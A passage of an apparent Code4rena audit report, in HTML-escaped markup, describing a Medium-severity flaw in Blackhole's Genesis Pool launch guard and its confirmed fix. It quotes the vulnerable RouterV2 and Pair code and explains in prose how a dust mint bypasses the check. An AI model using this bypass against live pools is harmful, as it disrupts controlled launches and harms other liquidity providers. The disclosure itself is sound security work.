6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description\u003c/h3\u003e\n\u003cp\u003eThe check that prevents external liquidity additions to “Genesis Pool” pairs before their official launch are insufficient. The \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e check can be bypassed once any LP tokens exist (even dust) and \u003ccode\u003ePair.mint()\u003c/code\u003e also has no \u003ccode\u003eisGenesis\u003c/code\u003e check at all, letting direct initial liquidity supply. This damages the controlled launch, let potential price manipulation and launch disruption and clearly stated intended behaviour.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003eRouterV2.addLiquidity\u003c/code\u003e guard issue:\u003c/strong\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"33\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// contracts/RouterV2.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(...) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eensure\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeadline\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ... {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(!(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Factory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eisGenesis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u0026amp;\u0026amp; \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;NA\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_safeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_safeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003eIf \u003ccode\u003eisGenesis(pair)\u003c/code\u003e is true and \u003ccode\u003etotalSupply()\u003c/code\u003e is 0, the inner condition \u003ccode\u003e(true \u0026#x26;\u0026#x26; true)\u003c/code\u003e is true. The \u003ccode\u003erequire(!true)\u003c/code\u003e fails, correctly blocking.\u003c/li\u003e\n\u003cli\u003eOnce \u003ccode\u003etotalSupply \u003e 0\u003c/code\u003e (for example after official GenesisPool launch, or a prior dust minting by an attacker), this check becomes \u003ccode\u003erequire(!(true \u0026#x26;\u0026#x26; false))\u003c/code\u003e which is \u003ccode\u003erequire(true)\u003c/code\u003e, allowing anyone to add liquidity using the router if the \u003ccode\u003eisGenesis\u003c/code\u003e flag hasn’t been cleared yet.\u003c/li\u003e\n\u003cli\u003eThis means if \u003ccode\u003eisGenesis\u003c/code\u003e flag is not set to false immediately before the GenesisPool contract calls \u003ccode\u003eaddLiquidity\u003c/code\u003e, then after the GenesisPool successfully adds its liquidity (making \u003ccode\u003etotalSupply \u003e 0\u003c/code\u003e), any subsequent call to \u003ccode\u003eRouterV2.addLiquidity()\u003c/code\u003e for that pair would pass the check, letting external LPs in prematurely.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003ePair.mint()\u003c/code\u003e is not restricted:\u003c/strong\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"34\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// contracts/Pair.sol:\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003emint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003elock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e));\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// gas savings, must be defined here since totalSupply can update in _mintFee\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esqrt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINIMUM_LIQUIDITY\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMINIMUM_LIQUIDITY\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// permanently lock the first MINIMUM_LIQUIDITY tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003emin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalSupply\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026#39;ILM\u0026#39;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Pair: INSUFFICIENT_LIQUIDITY_MINTED\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_mint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eliquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_update\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_balance1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_reserve1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e     \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eMint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_amount1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ePair.sol::mint()\u003c/code\u003e does not have any \u003ccode\u003eisGenesis\u003c/code\u003e status check.\u003c/li\u003e\n\u003cli\u003eAn attacker can transfer minimal \u003ccode\u003etoken0\u003c/code\u003e and \u003ccode\u003etoken1\u003c/code\u003e to a Genesis pair (where \u003ccode\u003eisGenesis == true\u003c/code\u003e and \u003ccode\u003etotalSupply == 0\u003c/code\u003e) and call \u003ccode\u003emint()\u003c/code\u003e directly.\u003c/li\u003e\n\u003cli\u003eThis mints LP tokens, makes \u003ccode\u003etotalSupply \u003e 0\u003c/code\u003e, and bypasses the (already weak) \u003ccode\u003eRouterV2.addLiquidity\u003c/code\u003e guard for that pair.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"impact-6\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-6\" aria-label=\"impact 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003cp\u003eThe impact isn’t a direct loss of deposited funds but is a significant disruption to a core protocol mechanism, potentially leading to unfair advantages, poor launch conditions for projects, and reduced trust. This fits a Medium severity: ”\u003cem\u003eAssets not at direct risk, but the function of the protocol or its availability could be impacted, or leak value with a hypothetical attack path with stated assumptions\u003c/em\u003e“.\u003c/p\u003e\n\u003cp\u003eThis is also clearly against this statement in \u003ccode\u003econtract diff / Liquidity Pool / PairFactory\u003c/code\u003e:\n”\u003cem\u003eWhen a pair gets listed as Genesis Pool until it’s not successfully launched noone should be able to add liquidity so we’re using this \u003ccode\u003eisGenesis\u003c/code\u003e flag to control add liquidity flow\u003c/em\u003e”\u003c/p\u003e\n\u003ch3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003eIn \u003ccode\u003eRouterV2.addLiquidity\u003c/code\u003e block if the pair is a Genesis Pool, regardless of \u003ccode\u003etotalSupply\u003c/code\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"35\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e- require(!(IBaseV1Factory(factory).isGenesis(pair) \u0026amp;\u0026amp; IBaseV1Pair(pair).totalSupply() == 0), \u0026quot;NA\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+ require(!IBaseV1Factory(factory).isGenesis(pair), \u0026quot;GENESIS_POOL_LIQUIDITY_LOCKED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"2\"\u003e\n\u003cli\u003eRestrict \u003ccode\u003ePair.mint()\u003c/code\u003e for genesis pairs by adding a check in \u003ccode\u003ePair.sol::mint()\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"36\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003efunction mint(address to) external lock returns (uint liquidity) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   require(!PairFactory(factory).isGenesis(address(this)), \u0026quot;GENESIS_POOL_MINT_LOCKED\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    // ... existing mint logic ...\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-46\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-39\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 